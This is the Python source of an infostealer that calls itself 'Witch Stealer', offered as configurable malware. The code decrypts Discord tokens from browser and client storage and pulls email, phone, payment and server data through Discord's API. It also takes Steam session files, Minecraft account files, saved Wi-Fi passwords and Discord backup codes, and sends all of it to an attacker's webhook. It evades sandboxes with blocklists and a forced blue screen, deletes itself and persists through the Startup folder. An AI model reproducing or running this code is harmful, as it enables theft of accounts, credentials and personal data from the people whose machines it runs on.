import requests
import psutil
import string
import zipfile
import platform
import subprocess
import json
import shutil
import re
import base64
import random
import win32crypt
import socket
import re
import wmi
import os
import win32api
import win32profile
import tempfile
import getpass
import sys
import ctypes
from ctypes import wintypes, byref, c_bool
from Crypto.Cipher import AES

__CONFIG__ = {
    "avatar_link": "https://i.imgur.com/YMLOX3J.png",
    "webhook": "",
    "discord": False,
    "system": False,
    "startup": False,
    "minecraft": False,
    "Steam": False,
    "Anti_Debugs_VM": False,
    "backupcode": False,
    "ERROR": False
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def debbug_check():
    print ("secret message")

def kill(name):
    killed = False
    notkilled = False
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == name.lower():
                proc.kill()
                killed = True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            notkilled = True
            continue
    return killed

def self_delete():
    try:
        if platform.system() == 'Windows':
            bat_file = os.path.join(os.environ['TEMP'], f"{random.randint(1000, 9999)}.bat")
            with open(bat_file, 'w') as f:
                f.write(f'@echo off\ntimeout /t 3 /nobreak > nul\ndel /f /q "{os.path.abspath(sys.argv[0])}"\ndel /f /q "{bat_file}"')
            subprocess.Popen(bat_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.remove(sys.argv[0])
    except:
        pass
    sys.exit(0)

def get_master_key(path: str):
    local_state_path = os.path.join(path, "Local State")
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        return None

def decrypt_value(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if encrypted_value[:3] == b"v10":
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode()
    except Exception:
        pass
    return ""

import requests
import json

def tokens(token: str):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
        )
    }

    try:
        user_get = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
        if user_get.status_code != 200:
            return

        user = user_get.json()

        BADGES = {
            1: "<:8485discordemployee:1163172252989259898>",
            2: "<:9928discordpartnerbadge:1163172304155586570>",
            4: "<:9171hypesquadevents:1163172248140660839>",
            8: "<:4744bughunterbadgediscord:1163172239970140383>",
            64: "<:6601hypesquadbravery:1163172246492287017>",
            128: "<:6936hypesquadbrilliance:1163172244474822746>",
            256: "<:5242hypesquadbalance:1163172243417858128>",
            512: "<:5053earlysupporter:1163172241996005416>",
            16384: "<:1757bugbusterbadgediscord:1163172238942543892>",
            131072: "<:1207iconearlybotdeveloper:1163172236807639143>",
            262144: "<:4149blurplecertifiedmoderator:1163172255489085481>",
            4194304: "<:1207iconactivedeveloper:1163172534443851868>",
        }

        user_id = user.get("id")
        user_name = user.get("username")
        email = user.get("email", "None")
        phone = user.get("phone", "None")
        guild_tag = user.get("primary_guild", {}).get("tag", "None")
        public_flags = user.get("public_flags", 0)
        avatar_hash = user.get("avatar")
        lang = user.get("locale")

        friendinvite_res = requests.post("https://discord.com/api/v9/users/@me/invites", headers=headers)
        friendinvite_code = friendinvite_res.json().get('code', 'None') if friendinvite_res.ok else 'None'

        user_badges = [name for bit, name in BADGES.items() if public_flags & bit]
        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else None

        premium_type = user.get("premium_type", 0)
        nitro_type = {
            0: "None",
            1: "<:nitro_classic:1363064691282149418> Nitro Classic",
            2: "<:nitro_booster:1363009541515513986> Nitro Boost",
            3: "<:nitro_booster:1363009541515513986> <:nitro_classic:1363064691282149418> Basic Nitro"
        }.get(premium_type, "❓️")

        mfa = "Enabled" if user.get("mfa_enabled", "❓️") else "Disabled"

        methods = "❌"
        try:
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
            if payment.ok:
                for method in payment.json():
                    if method['type'] == 1:
                        methods += "💳"
                    elif method['type'] == 2:
                        methods += "<:paypal:973417655627288666>"
                    else:
                        methods += "❓"
        except:
            pass

        guilds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers).json()

        found_guilds = False
        hq_guilds = []

        if isinstance(guilds, list):
            for guild in guilds:
                try:
                    admin = int(guild['permissions']) & 0x8 == 0x8
                    if admin:
                        preview_res = requests.get(
                            f"https://discord.com/api/v8/guilds/{guild['id']}/preview", headers=headers
                        )
                        if preview_res.status_code == 200:
                            preview = preview_res.json()
                            approximate_member_count = preview.get('approximate_member_count', 0)
                            approximate_presence_count = preview.get('approximate_presence_count', 0)
                        else:
                            approximate_member_count = 0
                            approximate_presence_count = 0

                        owner = "✅" if guild.get('owner', False) else "❌"

                        invites_res = requests.get(
                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers=headers
                        )
                        if invites_res.status_code == 200:
                            invites = invites_res.json()
                            if invites:
                                invite = f"https://discord.gg/{invites[0]['code']}"
                                found_guilds = True
                            else:
                                invite = "https://youtu.be/dQw4w9WgXcQ"
                        else:
                            invite = "https://youtu.be/dQw4w9WgXcQ"

                        data = (
                            f"\u200b\n**{guild['name']} ({guild['id']})** \n"
                            f"Owner: `{owner}` | Members: ` ⚫ {approximate_member_count} / 🟢 {approximate_presence_count} / 🔴 {approximate_member_count - approximate_presence_count} `\n"
                            f"[Join Server]({invite})"
                        )

                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                            break

                        hq_guilds.append(data)
                except Exception:
                    continue

        if hq_guilds:
            hq_guilds = '\n'.join(hq_guilds)
        else:
            hq_guilds = None
            #:TOKENPARADISE: 
            #<a:hq:1373228906743599155>
        fields = [
            {"name": "<a:TOKENPARADISE:1363009172290928690> TOKEN", "value": f"```{token}```", "inline": False},
            {"name": "<:9171hypesquadevents:1163172248140660839> Badge", "value": f"-# {', '.join(user_badges) if user_badges else 'None'}", "inline": True},
            {"name": ":white_check_mark: MFA", "value": mfa, "inline": True},
            {"name": "<a:n1:1380695050484453408> Nitro", "value": nitro_type, "inline": True},
            {"name": ":credit_card: Payment", "value": methods, "inline": True},
            {"name": "<:tag:1380757481390604429> TAG", "value": f"```{guild_tag}```", "inline": True},
            {"name": "<:lang:1380757912200282152> Language", "value": lang, "inline": True},
            {"name": "<a:hq:1373228906743599155> Friends Invite", "value": f"https://discord.gg/{friendinvite_code}", "inline": True},
            {"name": "<a:rainbow_heart:1380758186344317091> Email", "value": f"```{email}```", "inline": False},
            {"name": "<:Telephone:1380759026069016627> Phone", "value": f"```{phone}```", "inline": False},
        ]

        if found_guilds:
            fields.append({
                "name": "<a:hq:1373228906743599155> HQ Guilds",
                "value": hq_guilds,
                "inline": False
            })
        else:
            pass

        embed = {
            "username": "Witch Stealer",
            "avatar_url": __CONFIG__["avatar_link"],
            "embeds": [{
                "title": f"<:user:1380756103045976216> {user_name} ({user_id})",
                "color": 0x000000,
                "fields": fields,
                "thumbnail": {"url": avatar}
            }]
        }

        post_headers = {"Content-Type": "application/json"}
        requests.post(__CONFIG__["webhook"], data=json.dumps(embed), headers=post_headers)

    except Exception as e:
        print(f"Error: {e}")

def find_token():
    found_tokens = set()

    for app, path in PATHS.items():
        local_storage_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(local_storage_path):
            continue

        master_key = get_master_key(path)
        if master_key is None:
            continue

        for file in os.listdir(local_storage_path):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue

            try:
                with open(os.path.join(local_storage_path, file), "r", errors="ignore") as f:
                    for line in f:
                        matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
                        for match in matches:
                            try:
                                encrypted_token = base64.b64decode(match)
                                decrypted_token = decrypt_value(encrypted_token, master_key)
                                if decrypted_token:
                                    found_tokens.add(decrypted_token.strip())
                            except Exception:
                                continue
            except PermissionError:
                continue

    valid_tokens = [token for token in found_tokens if valid_token(token)]

    for token in valid_tokens:
        tokens(token)  

def valid_token(token: str) -> bool:

    valid = False
    invalid = False

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36'
    }
    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return response.status_code == 200
    except requests.RequestException:
        return False


def minecraft_profile():
    sent = False
    error = False
    appdata = os.getenv("APPDATA")
    accounts_path = os.path.join(appdata, ".minecraft", "launcher_accounts.json")
    usercache_path = os.path.join(appdata, ".minecraft", "usercache.json")

    launcher_account = "NOT FOUND"
    usercache = "NOT FOUND"

    if os.path.exists(accounts_path):
        with open(accounts_path, "r", encoding="utf-8") as src:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w+", encoding="utf-8") as temp:
                shutil.copyfileobj(src, temp)
                temp.seek(0)
                launcher_account = temp.read()

    if os.path.exists(usercache_path):
        with open(usercache_path, "r", encoding="utf-8") as src:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w+", encoding="utf-8") as temp:
                shutil.copyfileobj(src, temp)
                temp.seek(0)
                usercache = temp.read()

    data = {
        "username": "Witch Stealer",
        "avatar_url": __CONFIG__["avatar_link"],
        "embeds": [
            {
                "title": "Minecraft Profile",
                "color": 0x000000,
                "fields": [
                    {
                        "name": "launcher_accounts.json",
                        "value": f"```json\n{launcher_account[:1000]}```",  
                        "inline": False
                    },
                    {
                        "name": "usercache.json",
                        "value": f"```json\n{usercache[:1000]}```",  
                        "inline": False
                    }
                ],
            }
        ]
    }

    response = requests.post(__CONFIG__["webhook"], json=data)
    if response.status_code == 204:
        sent = True
    else:
        error = True

def minecraft_cache():

    minecraftprofilefound = False

    appdata = os.getenv("appdata")
    minecraft_path = os.path.join(appdata, ".minecraft")

    if os.path.exists(minecraft_path):
        minecraftprofilefound = True
        minecraft_profile()

def steam():
    kill("Steam.exe")
    os.system("cls")
    steam_path = os.environ.get("PROGRAMFILES(X86)", "") + "\\Steam"
    if os.path.exists(steam_path):
        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
        steam_config_path = os.path.join(steam_path, "config")

        zip_path = os.path.join(os.environ['TEMP'], "session_steam.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zp:
            if os.path.exists(steam_config_path):
                for root, dirs, files in os.walk(steam_config_path):
                    for file in files:
                        zp.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_path))
                for ssfn_file in ssfn_files:
                    zp.write(ssfn_file, os.path.basename(ssfn_file))

        embed = {
        "username": "Witch Stealer", 
        "avatar_url": __CONFIG__["avatar_link"],  
            "embeds": [
                {
                    "title": "Steam",
                    "color": 0x000000,
                    "description": "```✅️ Found Steam Session```",
                }
            ]
        }

        response = requests.post(__CONFIG__["webhook"], json=embed)
        if response.status_code != 204:
            pass 

        with open(zip_path, 'rb') as f:
            files = {'file': ('steam.zip', f)}
            users = {
                "username": "Witch Stealer"
            }
            requests.post(__CONFIG__["webhook"], data=users, files=files)

        os.remove(zip_path)

def systeminformation():
    hostname = socket.gethostname()
    username = os.getlogin()
    # display_username = "⚙️ [We Back Soon!]"

    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()

    def hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        return subprocess.check_output(command, shell=True, text=True).strip()

    def get_wifi_data() -> list[str]:
        networks = []
        try:
            output = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'],
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore').split('\n')

            profiles = [line.split(":")[1].strip() for line in output if "All User Profile" in line]

            for name in profiles:
                try:
                    result = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL
                    ).decode('utf-8', errors='ignore').split('\n')

                    password_lines = [line for line in result if "Key Content" in line]
                    password = password_lines[0].split(":")[1].strip() if password_lines else ""
                    networks.append(f'network = "{name} | {password or "[NONE]"}"')
                except subprocess.CalledProcessError:
                    networks.append(f'network = "{name} | [??]"')
        except subprocess.CalledProcessError:
            pass

        return networks

    hardware_id = hwid()
    cpu = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    try:
        ipinfo = requests.get("https://ipinfo.io/json")
        data = ipinfo.json()
    except Exception:
        data = {}

    wifi_list = get_wifi_data()
    wifi_str = "\n".join(wifi_list) if wifi_list else "[Wi-FI NONE]"

    fields = [
            {"name": "👤 USER", "value": f"```\nUSERNAME: {username}\nHOSTNAME: {hostname}```", "inline": False},
            {"name": "📱 SYSTEM", "value": f"```\nCPU: {cpu}\nGPU: {GPUm}\nHwid: {hardware_id}```"},
            {"name": "📡 NETWORK", "value": f"```\nIP Address: {data.get('ip')}\nCITY: {data.get('city')}\nREGION: {data.get('region')}\nCOUNTRY: {data.get('country')}\nTIMEZONE: {data.get('timezone')}```"},
            {"name": "📡 WIFI", "value": f"```\n{wifi_str}```"}
        ]

    embed = {
        "username": "Witch Stealer",
        "avatar_url": __CONFIG__["avatar_link"],
        "embeds": [{
            "title": "SYSTEM INFORMATION",
            "color": 0x000000,
            "fields": fields,
        }]
    }

    requests.post(__CONFIG__["webhook"], json=embed)

def blue_screen():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, byref(wintypes.DWORD()))
        except:
            os.system("taskkill /f /im explorer.exe")
            self_delete()
    else:
        print("\033[44m" + " " * 1000 + "\nSIMULATED BLUE SCREEN\nANTI-ANALYSIS TRIGGERED" + " " * 1000 + "\033[0m")
    self_delete()

def blue_screen():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, byref(wintypes.DWORD()))
        except:
            os.system("taskkill /f /im explorer.exe")
            self_delete()
    else:
        print("\033[44m" + " " * 1000 + "\nSIMULATED BLUE SCREEN\nANTI-ANALYSIS TRIGGERED" + " " * 1000 + "\033[0m")
    self_delete()


def debug_hwid():
    import uuid
    return str(uuid.UUID(int=uuid.getnode()))

def debug():
    debugs = False

    blackListedUsers = [
    'WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John',
    'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred',
    'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test',
    'RGzcBUyrznReg', '05h00Gi0', '05KvAUQKPQ', '21zLucUnfI85', '43By4', '4tgiizsLimS', '5sIBK', '5Y3y73', 'grepete',
    '64F2tKIqO5', '6O4KyHhJXBiR', '7DBgdxu', '7wjlGX7PjlW4', '8LnfAai9QdJR', '9yjCPsEYIMH', 'acox', 'Administrator', 'Amy',
    'andrea', 'AppOnFlySupport', 'ASPNET', 'azure', 'barbarray', 'benjah', 'Bruno', 'BUiA1hkm', 'BXw7q', 'cather',
    'cM0uEGN4do', 'cMkNdS6', 'DdQrgc', 'DefaultAccount', 'doroth', 'dOuyo8RV71', 'DVrzi', 'dxd8DJ7c', 'e60UW', 'ecVtZ5wE',
    'EGG0p', 'equZE3J', 'fNBDSlDTXY', 'G2DbYLDgzz8Y', 'GexwjQdjXG', 'GGw8NR', 'GJAm1NxXVm', 'GjBsjb', 'gL50ksOp', 'gu17B',
    'Guest', 'h86LHD', 'HAPUBWS', 'hbyLdJtcKyN1', 'ICQja5iT', 'IVwoKUF', 'IZZuXj', 'j6SHA37KA', 'j7pNjWM', 'JAW4Dz0',
    'JcOtj17dZx', 'jeremdiaz', 'John Doe', 'jude', 'katorres', 'kevans', 'kFu0lQwgX5P', 'KUv3bT4', 'l3cnbB8Ar5b8', 'lK3zMR',
    'lubi53aN14cU', 'Marci', 'Mr.None', 'noK4zG7ZhOf', 'nZAp7UBVaS1', 'o6jdigq', 'o8yTi52T', 'Of20XqH4VL', 'OgJb6GqgK0O',
    'OZFUCOD6', 'Paul Jones', 'pf5vj', 'PgfV1X', 'pWOuqdTDQ', 'QfofoG', 'QmIS5df7u', 'QORxJKNk', 'qZo9A', 'rB5BnfuR2',
    'rexburns', 'Rt1r7', 'ryjIJKIrOMs', 'S7Wjuf', 'sal.rosenburg', 'Steve', 'tHiF2T', 'tim', 'timcoo', 'TVM', 'txWas1m2t',
    'tylerfl', 'uHUQIuwoEFU', 'UiQcX', 'umehunt', 'umyUJ', 'Uox1tzaMO', 'UspG1y1C', 'vzY4jmH0Jw02', 'XMiMmcKziitD',
    'xPLyvzr8sgC', 'xUnUy', 'ykj0egq7fze', 'ymONofg', 'YmtRdbA', 'zOEsT'
]
    blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'AppOnFly-VPS', 'Sxljmtsa', 'DESKTOP-ET51AJO', '216041']
    blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
            '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7',
            '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
            'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
            'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
            '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0',
            '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
            'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8',
            '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250',
            '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E',
            '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3',
            'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026',
            'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85',
            'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
            'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
            '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009',
            'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9',
            '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE',
            '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
            '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE',
            'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173',
            'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C',
            'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
            '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2',
            'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5',
            '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F',
            'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
            '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
            'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
            'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6', 'A72511C9-61B7-4465-A6F3-C4AC5D477500']
    blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107', '154.61.71.50'] 
    
    response = requests.get('https://ipinfo.io/json', timeout=10) 
    if response.status_code == 200:
        data = response.json()
        ip = data.get('ip')

    get_user = getpass.getuser()
    get_pcname = platform.node()
    get_hwid = debug_hwid()

    
    if get_user in blackListedUsers:
        debugs = True
    if get_pcname in blackListedPCNames:
        debugs = True
    if get_hwid in blackListedHWIDS:
        debugs = True
    if ip in blackListedIPS:
        debugs = True

    if debugs:
        blue_screen()
    else:
        debugs = False
    

def discord_backup_code_steal():
    user_download_dir = os.path.join(os.environ['USERPROFILE'], 'Downloads')
    source_file = os.path.join(user_download_dir, 'discord_backup_codes.txt')

    if not os.path.exists(source_file):
        return

    temp_dir = tempfile.gettempdir()
    temp_file = os.path.join(temp_dir, 'discord_backup_codes.txt')

    shutil.copy2(source_file, temp_file)

    with open(temp_file, 'rb') as f:
        files = {'file': ('discord_backup_codes.txt', f)}
        requests.post(__CONFIG__["webhook"], json={"username": "Witch Stealer", "avatar_url": __CONFIG__['avatar_link']}, files=files)


def startup():
    my = sys.executable
    startupfolder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    path = os.path.join(startupfolder, os.path.basename(my))

    if my != path and not os.path.exists(path):
        shutil.copy2(my, path)
 
    else:
        pass

def fakeerror():
    ctypes.windll.user32.MessageBoxW(0, "A critical error has occurred.", "Windows Unexpected error", 0x10)

#def startup():
#   startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
#
#   current_file = sys.argv[0]
#    filename = os.path.basename(current_file)
#
#   target_path = os.path.join(startup_path, filename)
#
#    if not os.path.exists(target_path):
#        shutil.copy(current_file, target_path)
#    else:
#        return

def run_config():
    if __CONFIG__.get("Anti_Debugs_VM"):
        debug()
    # =========================== #
    if __CONFIG__.get("discord"):
        find_token()
    # =========================== #
    if __CONFIG__.get("backupcode"):
        discord_backup_code_steal()
    # =========================== #
    if __CONFIG__.get("system"):
        systeminformation()
    # =========================== #
    if __CONFIG__.get("startup"):
        startup()
    # =========================== #
    if __CONFIG__.get("minecraft"):
        minecraft_cache()
    # =========================== #
    if __CONFIG__.get("Steam"):
        steam()
    # =========================== #
    if __CONFIG__.get("ERROR"):
        fakeerror()

run_config()
